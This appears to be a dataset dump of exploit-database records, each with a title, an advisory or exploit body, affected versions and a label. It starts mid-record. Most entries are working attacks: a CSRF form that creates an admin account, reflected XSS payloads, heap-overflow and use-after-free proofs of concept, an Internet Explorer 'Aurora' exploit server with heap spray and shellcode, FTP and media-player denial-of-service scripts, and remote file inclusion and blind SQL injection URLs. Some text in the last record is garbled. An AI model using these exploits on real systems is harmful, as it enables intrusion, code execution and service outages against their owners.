style=""background-color:red;font-si= ze:40px;""><b>YOU ARE VULNERABLE!!!</b><br><br><br>Regards,<br><br> Benjamin Tobias Franz<br>Germany</body> --btf--  ===>>> PoC - End <<<===",['4.x/5.x/6.0'],1
37886,"up.time 7.5.0 - Cross-Site Scripting / Cross-Site Request Forgery (Add Admin) ﻿ up.time 7.5.0 XSS And CSRF Add Admin Exploit   Vendor: Idera Inc. Product web page: http://www.uptimesoftware.com Affected version: 7.5.0 (build 16) and 7.4.0 (build 13)  Summary: The next-generation of IT monitoring software.  Desc: The application allows users to perform certain actions via HTTP requests without performing any validity checks to verify the requests. This can be exploited to perform certain actions with administrative privileges if a logged-in user visits a malicious web site. Multiple cross-site scripting vulnerabilities were also discovered. The issue is triggered when input passed via the multiple parameters is not properly sanitized before being returned to the user. This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site.  Tested on: Jetty, PHP/5.4.34, MySQL            Apache/2.2.29 (Win64) mod_ssl/2.2.29 OpenSSL/1.0.1j PHP/5.4.34   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2015-5252 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5252.php   29.07.2015  --   CSRF Add Admin: ---------------  <html>   <body>     <form action=""http://127.0.0.1:9999/main.php?section=UserContainer&subsection=add&id=0"" method=""POST"">       <input type=""hidden"" name=""operation"" value=""submit"" />       <input type=""hidden"" name=""disableEditOfUsernameRoleGroup"" value=""false"" />       <input type=""hidden"" name=""username"" value=""Testingus4"" />       <input type=""hidden"" name=""password"" value=""123123"" />       <input type=""hidden"" name=""passwordConfirm"" value=""123123"" />       <input type=""hidden"" name=""firstname"" value=""Test"" />       <input type=""hidden"" name=""lastname"" value=""Ingus"" />       <input type=""hidden"" name=""location"" value=""Neverland"" />       <input type=""hidden"" name=""emailaddress"" value=""test4&#64;test&#46;test"" />       <input type=""hidden"" name=""emailtimeperiodid"" value=""1"" />       <input type=""hidden"" name=""phonenumber"" value=""111111"" />       <input type=""hidden"" name=""phonenumbertimeperiodid"" value=""1"" />       <input type=""hidden"" name=""windowshost"" value=""test"" />       <input type=""hidden"" name=""windowsworkgroup"" value=""testgroup"" />       <input type=""hidden"" name=""windowspopuptimeperiodid"" value=""1"" />       <input type=""hidden"" name=""landingpage"" value=""MyPortal"" />       <input type=""hidden"" name=""isonvacation"" value=""0"" />       <input type=""hidden"" name=""receivealerts"" value=""on"" />       <input type=""hidden"" name=""receivealerts"" value=""1"" />       <input type=""hidden"" name=""alertoncritical"" value=""on"" />       <input type=""hidden"" name=""alertoncritical"" value=""1"" />       <input type=""hidden"" name=""alertonwarning"" value=""on"" />       <input type=""hidden"" name=""alertonwarning"" value=""1"" />       <input type=""hidden"" name=""alertonunknown"" value=""on"" />       <input type=""hidden"" name=""alertonunknown"" value=""1"" />       <input type=""hidden"" name=""alertonrecovery"" value=""on"" />       <input type=""hidden"" name=""alertonrecovery"" value=""1"" />       <input type=""hidden"" name=""activexgraphs"" value=""0"" />       <input type=""hidden"" name=""newuser"" value=""on"" />       <input type=""hidden"" name=""newuser"" value=""1"" />       <input type=""hidden"" name=""userroleid"" value=""2"" />       <input type=""hidden"" name=""usergroupid&#91;&#93;"" value=""1"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>   Reflected XSS: --------------  GET /main.php?section=UserContainer&subsection=edit&id=bc6ac%22%3E%3Cimg%20src%3da%20onerror%3dalert%28document.cookie%29;%3E&name=Testingus4 HTTP/1.1 - GET /main.php?section=UserGroup&subsection=add&operation=submit&id=0&usergroupname=kakodane1&usergroupdescription=kakodane2&usermembership%5B%5D=6&entitymembership%5B%5D=1&entitygroupmembership%5B%5D=1a416c%253c%252fscript%253e%253cscript%253ealert%25281%2529%253c%252fscript%253ea233bd169b0 HTTP/1.1 - GET /main.php?section=UserGroup&subsection=add&operation=submit&id=0&usergroupname=kakodane1&usergroupdescription=kakodane2&usermembership%5B%5D=6&entitymembership%5B%5D=14f2e6%253c%252fscript%253e%253cscript%253ealert%25281%2529%253c%252fscript%253e46cfd43d432&entitygroupmembership%5B%5D=1 HTTP/1.1 - GET /main.php?section=UserContainer&subsection=edit&id=bc6ac""><img%20src%3da%20onload%3dalert(1)>f2c23&name=Testingus4 HTTP/1.1 - GET /main.php?page=Users&subPage=UserContainer&subsection=view&id=240689'%3balert(1)%2f%2f205 HTTP/1.1 - GET /main.php?section=UserContainer&subsection=edit&id=6&name=Testingus4e8b7f%253c%252ftitle%253e%253cscript%253ealert%25281%2529%253c%252fscript%253eadfb7 HTTP/1.1 - GET /main.php?section=UserContainer&subsection=edit7bef8%253c%252ftitle%253e%253cscript%253ealert%25281%2529%253c%252fscript%253ea9095&id=6&name=Testingus4 HTTP/1.1 - GET /main.php?section=UserGroup&subsection=add270d4%253c%252ftitle%253e%253cscript%253ealert%25281%2529%253c%252fscript%253e8c1acb1f950&operation=submit&id=0&usergroupname=kakodane1&usergroupdescription=kakodane2&usermembership%5B%5D=6&entitymembership%5B%5D=1&entitygroupmembership%5B%5D=1 HTTP/1.1 - GET /main.php?page=Reports&subPage=ReportResourceUsage&subsection=edit&operation=submit&range_type=explicit&txtFromDate=2015-07-28a3345""><img%20src%3da%20onload%3dalert(1)>2d6845d9556&txtFromTime=00%3A00%3A00&txtToDate=2015-07-28&txtToTime=23%3A59%3A59&quickdatevalue=1&quickdatetype=day&relativedate=today&value_%5BselectAll_reportoptions%5D=false&reportoptions%5BreportResourceUtilization%5D-visible-checkbox=true&reportoptions%5BreportResourceUtilization%5D=true&reportoptions%5BchartCPUStats%5D-visible-checkbox=true&reportoptions%5BchartCPUStats%5D=true&reportoptions%5BchartMultiCPUPerformanceTotal%5D=false&reportoptions%5BchartNetworkIO%5D=false&reportoptions%5BchartNetworkErrors%5D=false&reportoptions%5BchartTCPRetransmits%5D=false&reportoptions%5BchartFreeMemory%5D=false&reportoptions%5BchartPageScanningStats%5D=false&reportoptions%5BchartDiskStats%5D=false&reportoptions%5BchartFSCap%5D=false&reportoptions%5BchartWorkloadCPU%5D=false&reportoptions%5BchartWorkloadMemSize%5D=false&reportoptions%5BchartWorkloadRSS%5D=false&reportoptions%5BgroupReportBySystem%5D-visible-checkbox=true&reportoptions%5BgroupReportBySystem%5D=true&listtype=system&value_%5BselectAll_entitygroup%5D=false&value_%5Bincludesubgroups%5D=true&includesubgroups=on&entitygroup%5B1%5D=false&value_%5BselectAll_entityview%5D=false&value_%5BselectAll_entity%5D=false&entity%5B1%5D=false&generate_xml=XML+to+Screen&email_type_save=email_user_save&user_email_id_save=1&other_email_address_save=&save_as_name=&save_as_description=&genopt=htmlscreen&email_type=email_user&user_email_id=1&other_email_address= HTTP/1.1 - GET /main.php?page=Reports&subPage=ReportResourceUsage&subsection=edit&operation=submit&range_type=explicit&txtFromDate=2015-07-28&txtFromTime=00%3a00%3a006795f""><img%20src%3da%20onload%3dalert(1)>c92fbc98475&txtToDate=2015-07-28&txtToTime=23%3A59%3A59&quickdatevalue=1&quickdatetype=day&relativedate=today&value_%5BselectAll_reportoptions%5D=false&reportoptions%5BreportResourceUtilization%5D-visible-checkbox=true&reportoptions%5BreportResourceUtilization%5D=true&reportoptions%5BchartCPUStats%5D-visible-checkbox=true&reportoptions%5BchartCPUStats%5D=true&reportoptions%5BchartMultiCPUPerformanceTotal%5D=false&reportoptions%5BchartNetworkIO%5D=false&reportoptions%5BchartNetworkErrors%5D=false&reportoptions%5BchartTCPRetransmits%5D=false&reportoptions%5BchartFreeMemory%5D=false&reportoptions%5BchartPageScanningStats%5D=false&reportoptions%5BchartDiskStats%5D=false&reportoptions%5BchartFSCap%5D=false&reportoptions%5BchartWorkloadCPU%5D=false&reportoptions%5BchartWorkloadMemSize%5D=false&reportoptions%5BchartWorkloadRSS%5D=false&reportoptions%5BgroupReportBySystem%5D-visible-checkbox=true&reportoptions%5BgroupReportBySystem%5D=true&listtype=system&value_%5BselectAll_entitygroup%5D=false&value_%5Bincludesubgroups%5D=true&includesubgroups=on&entitygroup%5B1%5D=false&value_%5BselectAll_entityview%5D=false&value_%5BselectAll_entity%5D=false&entity%5B1%5D=false&generate_xml=XML+to+Screen&email_type_save=email_user_save&user_email_id_save=1&other_email_address_save=&save_as_name=&save_as_description=&genopt=htmlscreen&email_type=email_user&user_email_id=1&other_email_address= HTTP/1.1 - GET /main.php?page=Reports&subPage=ReportResourceUsage&subsection=edit&operation=submit&range_type=explicit&txtFromDate=2015-07-28&txtFromTime=00%3A00%3A00&txtToDate=2015-07-28c0570""><img%20src%3da%20onload%3dalert(1)>77b8cd697e9&txtToTime=23%3A59%3A59&quickdatevalue=1&quickdatetype=day&relativedate=today&value_%5BselectAll_reportoptions%5D=false&reportoptions%5BreportResourceUtilization%5D-visible-checkbox=true&reportoptions%5BreportResourceUtilization%5D=true&reportoptions%5BchartCPUStats%5D-visible-checkbox=true&reportoptions%5BchartCPUStats%5D=true&reportoptions%5BchartMultiCPUPerformanceTotal%5D=false&reportoptions%5BchartNetworkIO%5D=false&reportoptions%5BchartNetworkErrors%5D=false&reportoptions%5BchartTCPRetransmits%5D=false&reportoptions%5BchartFreeMemory%5D=false&reportoptions%5BchartPageScanningStats%5D=false&reportoptions%5BchartDiskStats%5D=false&reportoptions%5BchartFSCap%5D=false&reportoptions%5BchartWorkloadCPU%5D=false&reportoptions%5BchartWorkloadMemSize%5D=false&reportoptions%5BchartWorkloadRSS%5D=false&reportoptions%5BgroupReportBySystem%5D-visible-checkbox=true&reportoptions%5BgroupReportBySystem%5D=true&listtype=system&value_%5BselectAll_entitygroup%5D=false&value_%5Bincludesubgroups%5D=true&includesubgroups=on&entitygroup%5B1%5D=false&value_%5BselectAll_entityview%5D=false&value_%5BselectAll_entity%5D=false&entity%5B1%5D=false&generate_xml=XML+to+Screen&email_type_save=email_user_save&user_email_id_save=1&other_email_address_save=&save_as_name=&save_as_description=&genopt=htmlscreen&email_type=email_user&user_email_id=1&other_email_address= HTTP/1.1 - GET /main.php?page=Reports&subPage=ReportResourceUsage&subsection=edit&operation=submit&range_type=explicit&txtFromDate=2015-07-28&txtFromTime=00%3A00%3A00&txtToDate=2015-07-28&txtToTime=23%3a59%3a592b983""><img%20src%3da%20onload%3dalert(1)>0d9cc3967ae&quickdatevalue=1&quickdatetype=day&relativedate=today&value_%5BselectAll_reportoptions%5D=false&reportoptions%5BreportResourceUtilization%5D-visible-checkbox=true&reportoptions%5BreportResourceUtilization%5D=true&reportoptions%5BchartCPUStats%5D-visible-checkbox=true&reportoptions%5BchartCPUStats%5D=true&reportoptions%5BchartMultiCPUPerformanceTotal%5D=false&reportoptions%5BchartNetworkIO%5D=false&reportoptions%5BchartNetworkErrors%5D=false&reportoptions%5BchartTCPRetransmits%5D=false&reportoptions%5BchartFreeMemory%5D=false&reportoptions%5BchartPageScanningStats%5D=false&reportoptions%5BchartDiskStats%5D=false&reportoptions%5BchartFSCap%5D=false&reportoptions%5BchartWorkloadCPU%5D=false&reportoptions%5BchartWorkloadMemSize%5D=false&reportoptions%5BchartWorkloadRSS%5D=false&reportoptions%5BgroupReportBySystem%5D-visible-checkbox=true&reportoptions%5BgroupReportBySystem%5D=true&listtype=system&value_%5BselectAll_entitygroup%5D=false&value_%5Bincludesubgroups%5D=true&includesubgroups=on&entitygroup%5B1%5D=false&value_%5BselectAll_entityview%5D=false&value_%5BselectAll_entity%5D=false&entity%5B1%5D=false&generate_xml=XML+to+Screen&email_type_save=email_user_save&user_email_id_save=1&other_email_address_save=&save_as_name=&save_as_description=&genopt=htmlscreen&email_type=email_user&user_email_id=1&other_email_address= HTTP/1.1 - GET /main.php?section=UserGroup&subsection=add&operation=submit&id=0&usergroupname=kakodane1&usergroupdescription=kakodane26cca6""><img%20src%3da%20onload%3dalert(1)>84e475837bc&usermembership%5B%5D=6&entitymembership%5B%5D=1&entitygroupmembership%5B%5D=1 HTTP/1.1 - GET /main.php?section=UserGroup&subsection=add&operation=submit&id=0&usergroupname=kakodane1&usergroupdescription=kakodane2&usermembership%5B%5D=6b50fa%253c%252fscript%253e%253cscript%253ealert%25281%2529%253c%252fscript%253ed94954ba0d3&entitymembership%5B%5D=1&entitygroupmembership%5B%5D=1 HTTP/1.1",['7.5.0'],1
12217,"Aircrack-NG Tools svn r1675 - Remote Heap Buffer Overflow (PoC) #!/usr/bin/env python # -*- coding: UTF-8 -*-  ''' A remote-exploit against the aircrack-ng tools. Tested up to svn r1675.          The tools' code responsible for parsing IEEE802.11-packets assumes the     self-proclaimed length of a EAPOL-packet to be correct and never to exceed     a (arbitrary) maximum size of 256 bytes for packets that are part of the     EAPOL-authentication. We can exploit this by letting the code parse packets     which:      a) proclaim to be larger than they really are, possibly causing the code         to read from invalid memory locations while copying the packet;      b) really do exceed the maximum size allowed and overflow data structures         allocated on the heap, overwriting libc's allocation-related         structures. This causes heap-corruption.          Both problems lead either to a SIGSEGV or a SIGABRT, depending on the code-     path. Careful layout of the packet's content can even possibly alter the     instruction-flow through the already well known heap-corruption paths     in libc. Playing with the proclaimed length of the EAPOL-packet and the     size and content of the packet's padding immediately end up in various     assertion errors during calls to free(). This reveals the possibility to     gain control over $EIP.          Given that we have plenty of room for payload and that the tools are     usually executed with root-privileges, we should be able to have a     single-packet-own-everything exploit at our hands. As the attacker can     cause the various tools to do memory-allocations at his will (through     faking the appearance of previously unknown clients), the resulting     exploit-code should have a high probability of success.      The demonstration-code below requires Scapy >= 2.x and Pyrit >= 0.3.1-dev     r238 to work. It generates pcap-file with single packet of the following     content:          0801000000DEADC0DE0000DEADC0DE010000000000000000AAAA03000000888E0103FDE8FE0     108000000000000000000000000000000000000000000000000000000000000000000000000     000000000000000000000000000000000000000000000000000000000000000000000000000     000000000000000000000000000000000000043616E20492068617320736F6D65206D6F6172     3F      03/27/2010, Lukas Lueg, lukas.lueg@gmail.com '''  import cpyrit.pckttools import scapy.layers  # A IEEE802.11-packet with LLC- and SNAP-header, looking like the second # phase of a EAPOL-handshake (the confirmation). The size set in the EAPOL- # packet will cause an overflow of the ""eapol""-field in struct WPA_ST_info and # struct WPA_hdsk. # We have plenty of room for exploit-payload as most of the fields in the # EAPOL_Key-packet are not interpreted. As far as I can see, the adjacent # heap structure will be overwritten by the value of EAPOL_WPAKey.Nonce in # case of airodump-ng... pckt = scapy.layers.dot11.Dot11(addr1='00:de:ad:c0:de:00',       \                                 addr2='00:de:ad:c0:de:01',       \                                 FCfield='to-DS')                 \        / scapy.layers.dot11.LLC()                                \        / scapy.layers.dot11.SNAP()                               \        / scapy.layers.l2.EAPOL(len=65000)                        \        / cpyrit.pckttools.EAPOL_Key()                            \        / cpyrit.pckttools.EAPOL_WPAKey(KeyInfo = 'pairwise+mic') \        / scapy.packet.Padding(load='Can I has some moar?')  if __name__ == '__main__':     print ""Packet's content:""     print ''.join(""%02X"" % ord(c) for c in str(pckt))     filename = 'aircrackng_exploit.cap'     print ""Writing to '%s'"" % filename     writer = cpyrit.pckttools.Dot11PacketWriter(filename)     writer.write(pckt)     writer.close()     print 'Done'","['svn', 'r1675']",1
38122,"PHP 5.4/5.5/5.6 - SplObjectStorage 'Unserialize()' Use-After-Free Yet Another Use After Free Vulnerability in unserialize() with SplObjectStorage  Taoguang Chen <[@chtg](http://github.com/chtg)>  Write Date: 2015.8.27  Release Date: 2015.9.4  A use-after-free vulnerability was discovered in unserialize() with SplObjectStorage object's deserialization and crafted object's __wakeup() magic method that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.  Affected Versions ------------ Affected is PHP 5.6 < 5.6.13 Affected is PHP 5.5 < 5.5.29 Affected is PHP 5.4 < 5.4.45  Credits ------------ This vulnerability was disclosed by Taoguang Chen.  Description ------------       ALLOC_INIT_ZVAL(pentry);     if (!php_var_unserialize(&pentry, &p, s + buf_len, &var_hash TSRMLS_CC)) {       zval_ptr_dtor(&pentry);       goto outexcept;     }     if(Z_TYPE_P(pentry) != IS_OBJECT) {       goto outexcept;     }     ALLOC_INIT_ZVAL(pinf);     if (*p == ',') { /* new version has inf */       ++p;       if (!php_var_unserialize(&pinf, &p, s + buf_len, &var_hash TSRMLS_CC)) {         zval_ptr_dtor(&pinf);         goto outexcept;       }     }   It has been demonstrated many times before that __wakeup() leads to ZVAL is freed from memory. However during deserialization will still allow to use R: or r: to set references to that already freed memory. It is possible to use-after-free attack and execute arbitrary code remotely.  Proof of Concept Exploit ------------ The PoC works on standard MacOSX 10.11 installation of PHP 5.6.12.   <?php  class obj {   var $ryat;   function __wakeup() {     $this->ryat = 1;   } }  $fakezval = ptr2str(1122334455); $fakezval .= ptr2str(0); $fakezval .= ""\x00\x00\x00\x00""; $fakezval .= ""\x01""; $fakezval .= ""\x00""; $fakezval .= ""\x00\x00"";  $inner = 'x:i:1;O:8:""stdClass"":0:{},i:1;;m:a:0:{}'; $exploit = 'a:5:{i:0;i:1;i:1;C:16:""SplObjectStorage"":'.strlen($inner).':{'.$inner.'}i:2;O:3:""obj"":1:{s:4:""ryat"";R:3;}i:3;R:6;i:4;s:'.strlen($fakezval).':""'.$fakezval.'"";}';  $data = unserialize($exploit);  var_dump($data);  function ptr2str($ptr) {   $out = '';   for ($i = 0; $i < 8; $i++) {     $out .= chr($ptr & 0xff);     $ptr >>= 8;   }   return $out; }  ?>   Test the PoC on the command line:   $ php uafpoc.php array(5) {   [0]=>   int(1)   [1]=>   &int(1)   [2]=>   object(obj)#3 (1) {     [""ryat""]=>     &int(1)   }   [3]=>   int(1122334455)  <===  so we can control the memory and create fake ZVAL :)   [4]=>   string(24) ""?v?B????"" }","['5.4/5.5/5.6', '5.6.12']",1
20774,"Microsoft Internet Explorer 5.5 - CLSID File Execution source: https://www.securityfocus.com/bid/2612/info  The default operation performed to open a filetype is determining by referencing the filetype's CLSID. Due to a flaw in the interpretation of CLSIDs when appended to a filename, it is possible to specify a different default action for a given file than would normally be used. As a result, seemingly harmless files (.txt, .jpg etc) may be opened in a nonstandard, attacker specified manner. For example, a program (""evil.exe"") could be renamed ""evil.jpg.{CLSID_of_executables}"" and when opened by the target user, this file will be executed instead of opened by their default .jpg viewer.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/20774.zip",['5.5'],1
34279,"LibTIFF 3.9.4 - Unknown Tag Second Pass Processing Remote Denial of Service source: https://www.securityfocus.com/bid/41477/info  LibTIFF is prone to a denial-of-service vulnerability because it fails to properly validate user-supplied input.  An attacker can exploit this issue to crash an application that uses the vulnerable library, denying service to legitimate users.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/34279.tif",['3.9.4'],1
24092,"PHPX 3.x - '/forums.php' Cross-Site Request Forgery / Arbitrary Command Execution source: https://www.securityfocus.com/bid/10284/info    It has been reported that PHPX is affected by multiple administrator command execution vulnerabilities. These issues are due to a failure of the application to properly validate access to administrative commands.    This issue could permit a remote attacker to create a malicious URI link or embed a malicious URI between bbCode image tags, which includes hostile HTML and script code. If an unsuspecting forum administrator activated this URI, the attacker-supplied command would be carried out with the administrator's privileges. This would occur in the security context of the affected web site and would cause various administrator actions to be taken.  http://www.example.com/admin/forums.php?action=words&subaction=delete&word_id=[VID] http://www.example.com/admin/forums.php?action=flag&subaction=delete&flag_id=[VID] http://www.example.com/admin/forums.php?action=xcode&subaction=delete&xcode_id=[VID]",['3.x'],1
11167,"Microsoft Internet Explorer 6 - 'Aurora' Memory Corruption (MS10-002) # #   Author : Ahmed Obied (ahmed.obied@gmail.com) # #   This program acts as a web server that generates an exploit to  #   target a vulnerability (CVE-2010-0249) in Internet Explorer.  #   The exploit was tested using Internet Explorer 6 on Windows XP SP2.  #   The exploit's payload spawns the calculator.  # #   Usage  : python ie_aurora.py [port number] #      import sys import socket  from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler          class RequestHandler(BaseHTTPRequestHandler):      def convert_to_utf16(self, payload):         enc_payload = ''         for i in range(0, len(payload), 2):             num = 0             for j in range(0, 2):                 num += (ord(payload[i + j]) & 0xff) << (j * 8)             enc_payload += '%%u%04x' % num         return enc_payload                      def get_payload(self):         # win32_exec - EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub         # http://metasploit.com         payload  = '\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73'         payload += '\x13\x6f\x02\xb1\x0e\x83\xeb\xfc\xe2\xf4\x93\xea\xf5\x0e'         payload += '\x6f\x02\x3a\x4b\x53\x89\xcd\x0b\x17\x03\x5e\x85\x20\x1a'         payload += '\x3a\x51\x4f\x03\x5a\x47\xe4\x36\x3a\x0f\x81\x33\x71\x97'         payload += '\xc3\x86\x71\x7a\x68\xc3\x7b\x03\x6e\xc0\x5a\xfa\x54\x56'         payload += '\x95\x0a\x1a\xe7\x3a\x51\x4b\x03\x5a\x68\xe4\x0e\xfa\x85'         payload += '\x30\x1e\xb0\xe5\xe4\x1e\x3a\x0f\x84\x8b\xed\x2a\x6b\xc1'         payload += '\x80\xce\x0b\x89\xf1\x3e\xea\xc2\xc9\x02\xe4\x42\xbd\x85'         payload += '\x1f\x1e\x1c\x85\x07\x0a\x5a\x07\xe4\x82\x01\x0e\x6f\x02'         payload += '\x3a\x66\x53\x5d\x80\xf8\x0f\x54\x38\xf6\xec\xc2\xca\x5e'         payload += '\x07\x7c\x69\xec\x1c\x6a\x29\xf0\xe5\x0c\xe6\xf1\x88\x61'         payload += '\xd0\x62\x0c\x2c\xd4\x76\x0a\x02\xb1\x0e'         return self.convert_to_utf16(payload)          def get_exploit(self):         exploit = '''         <html>         <head>             <script>                          var obj, event_obj;                          function spray_heap()             {                 var chunk_size, payload, nopsled;                              chunk_size = 0x80000;                 payload = unescape(""<PAYLOAD>"");                 nopsled = unescape(""<NOP>"");                 while (nopsled.length < chunk_size)                     nopsled += nopsled;                 nopsled_len = chunk_size - (payload.length + 20);                         nopsled = nopsled.substring(0, nopsled_len);                 heap_chunks = new Array();                 for (var i = 0 ; i < 200 ; i++)                     heap_chunks[i] = nopsled + payload;             }                      function initialize()             {                 obj = new Array();                 event_obj = null;                 for (var i = 0; i < 200 ; i++ )                     obj[i] = document.createElement(""COMMENT"");             }                      function ev1(evt)             {                 event_obj = document.createEventObject(evt);                 document.getElementById(""sp1"").innerHTML = """";                 window.setInterval(ev2, 1);             }                    function ev2()             {                 var data, tmp;                                  data = """";                 tmp = unescape(""%u0a0a%u0a0a"");                 for (var i = 0 ; i < 4 ; i++)                     data += tmp;                 for (i = 0 ; i < obj.length ; i++ ) {                     obj[i].data = data;                 }                 event_obj.srcElement;             }                                  function check()             {                 if (navigator.userAgent.indexOf(""MSIE"") == -1)                     return false;                 return true;                }                          if (check()) {                 initialize();                 spray_heap();                            }             else                 window.location = 'about:blank'                              </script>         </head>         <body>             <span id=""sp1"">             <img src=""aurora.gif"" onload=""ev1(event)"">             </span>                 </body>         </html>         '''         exploit = exploit.replace('<PAYLOAD>', self.get_payload())         exploit = exploit.replace('<NOP>', '%u0a0a%u0a0a')         return exploit       def get_image(self):         content  = '\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'         content += '\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44'         content += '\x01\x00\x3b'         return content      def log_request(self, *args, **kwargs):         pass              def do_GET(self):         try:             if self.path == '/':                 print                 print '[-] Incoming connection from %s' % self.client_address[0]                 self.send_response(200)                  self.send_header('Content-Type', 'text/html')                 self.end_headers()                 print '[-] Sending exploit to %s ...' % self.client_address[0]                 self.wfile.write(self.get_exploit())                 print '[-] Exploit sent to %s' % self.client_address[0]             elif self.path == '/aurora.gif':                       self.send_response(200)                 self.send_header('Content-Type', 'image/gif')                 self.end_headers()                 self.wfile.write(self.get_image())         except:              print '[*] Error : an error has occured while serving the HTTP request'             print '[-] Exiting ...'             sys.exit(-1)                                      def main():     if len(sys.argv) != 2:         print 'Usage: %s [port number (between 1024 and 65535)]' % sys.argv[0]         sys.exit(0)     try:         port = int(sys.argv[1])         if port < 1024 or port > 65535:             raise ValueError         try:             serv = HTTPServer(('', port), RequestHandler)             ip = socket.gethostbyname(socket.gethostname())             print '[-] Web server is running at http://%s:%d/' % (ip, port)             try:                 serv.serve_forever()             except:                 print '[-] Exiting ...'          except socket.error:             print '[*] Error : a socket error has occurred'         sys.exit(-1)         except ValueError:         print '[*] Error : an invalid port number was given'         sys.exit(-1)              if __name__ == '__main__':     main()",['6'],1
886,"PlatinumFTP 1.0.18 - Multiple Remote Denial of Service Vulnerabilities #!/usr/bin/perl # # pftpdos-ai1.pl - Remote DoS against PlatinumFTP 10.1.18 # Details:http://seclists.org/lists/bugtraq/2005/Mar/0222.html # # If you don't get the server down try to change/play a little bit with # the Timeout # # ports at securityforest dot com | greetings to muts, barabas, s|33py, # revised and all guys at www.whitehat.co.il # # Thanks to str0ke from milw0rm for forcing me to shrink 3 PoCs into 1 :) # # 2005/05/03 portsonline.net  use strict; use Net::FTP;  my $host; my $username; my $dostype;  if ($#ARGV < 1) { &syntax(); }  $host = $ARGV[0]; $dostype = $ARGV[1];  if ($dostype == '1') { $username = '\\'; } if ($dostype == '2') { $username = '%s%s%s%s'; } if ($dostype == '3') { $username = '%.1024d'; }  my $ftp = Net::FTP->new($host, Timeout => 2, Debug => 0, Port => 21) or die ""can you see a ftp server? i can't.\n"";  print ""denial of service tpye $dostype in progress\n"";  while (my $ftp = Net::FTP->new($host, Timeout => 2, Debug => 0, Port => 21)) {     my $ftp = Net::FTP->new($host, Timeout => 0.1, Debug => 0, Port => 21);     $ftp->login($username); }  print ""server is down. now run forest, RUN!\n"";  sub syntax {     print ""Usage: pftpdos-ai1.pl IP DOSTYPE(1-3)\n\n"";     print ""DOSTYPE: 1 Using '\\' Username \n"";     print ""DOSTYPE: 2 Using '%s%s%s%s' Username \n"";     print ""DOSTYPE: 3 Using '%.1024d' Username \n"";     exit (1); }  # milw0rm.com [2005-03-17]",['1.0.18'],1
6859,Agares ThemeSiteScript 1.0 - 'loadadminpage' Remote File Inclusion **************************************************************************************  Author : DaRkLiFe Greetz : str0ke & S.W.A.T. & funkys0ul & Team 1nF3Ct3d  ************************************************************************************** Script   :  ThemeSiteScript v1.0 Remote File Inclusion Vulnerability  Home Page :  http://agaresmedia.com  Download :  http://rapidshare.com/files/72501220/ThemeSiteScript_1.0_webgraf.ru.rar  **************************************************************************************  Exploit :  http://localhost/upload/admin/frontpage_right.php?loadadminpage=Sh3lLz?  **************************************************************************************  Vulnerable : line 2 : <?PHP include($loadadminpage); ?>  **************************************************************************************  THANKS ! GREETZ ! HAPPY DIWALI ! **************************************************************************************  # milw0rm.com [2008-10-28],['v1.0'],1
15193,"Hanso Player 1.3.0 - '.m3u' Denial of Service # Exploit Title: Hanso Player Version 1.3.0 (.m3u) DoS # Date: 10/02/2010 # Author: xsploited security # Software Link: http://www.hansotools.com/downloads/hanso-player-setup.exe # Version: 1.3.0 # Tested on: Windows XP Pro SP3 # CVE : N/A  ######################################################### #EAX 00000001 #ECX 80567B8E #EDX EDD619A0 #EBX 003E320C ASCII ""h    "" #ESP 0103FF24 #EBP 0103FF58 #ESI 0103FF80 #EDI 001610D0 #EIP 7C90E460 ntdll.KiUserCallbackDispatcher  #Process terminated, exit code C0000409 (-1073740791.) #########################################################  #!/usr/bin/perl my $file = ""crash.m3u""; my $junk = ""\x41"" x 1337; open($FILE,"">$file""); print $FILE $junk; print ""\ncrash.m3u file created successfully\n1.) Open it with Hanso player\n2.) Application failure...\n""; close($FILE);",['1.3.0'],1
29811,"Atlassian JIRA 3.4.2 - IssueNavigator.JSPA Cross-Site Scripting source: https://www.securityfocus.com/bid/23244/info  Atlassian JIRA is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Version 3.4.2 is affected; prior versions may also be vulnerable.   http://www.example.com/path/secure/IssueNavigator.jspa?mode=hide&requestId=""><script>alert(""xss"");</script http://www.example.com/path/secure/IssueNavigator.jspa?mode=hide&requestId=""><scriptsrc=http://www.example2.com/re.js></script>",['3.4.2'],1
7274,ASPReferral 5.3 - 'AccountID' Blind SQL Injection [~] ----------------------------Ø¨Ø³Ù… Ø§Ù„Ù„Ù‡ Ø§Ù„Ø±Ø­Ù…Ù† Ø§Ù„Ø±Ø­ÙŠÙ…------------------------------  [~]Tybe:(Merchantsadd.asp AccountID) Blind SQL Injection Vulnerability      [~]Vendor:www.activewebsoftwares.com      [~]Software: ASPReferral      [~]author: ((Ñ3d D3v!L))      [~] Date: 28.11.2008      [~] Home: www.ahacker.biz      [~] contact: N/A  [~] -----------------------------------------------------------      [~]3xpL0!7 4 d3m0:       http://www.activewebsoftwares.com/demoaspreferral/Merchantsadd.asp?AccountID={bL!ND}      [~] 8L!/\/D:       7Ru3 : Merchantsadd.asp?AccountID= 1 and 1=1   f4L53: Merchantsadd.asp?AccountID= 1 and 1=2           [~]--------------------------------------------------------------------------------      [~] Greetz tO: {str0ke} &keta &m4n0n & maxmos & EV!L KS@ & hesham_hacker &Ø§Ù„Ø²Ù‡ÙŠØ±ÙŠ   [~]   [~] spechial thanks : dolly & 7am3m & Ø¹Ù…Ø§Ø¯ & {str0ke}   [~]   [~] EV!L !NS!D3 734M --- R3d-D3v!L--EXOT!C --poison scorbion --samakiller   [~]   [~] xp10.biz & ahacker.biz   [~]    [~]--------------------------------------------------------------------------------  # milw0rm.com [2008-11-29],['5.3'],1
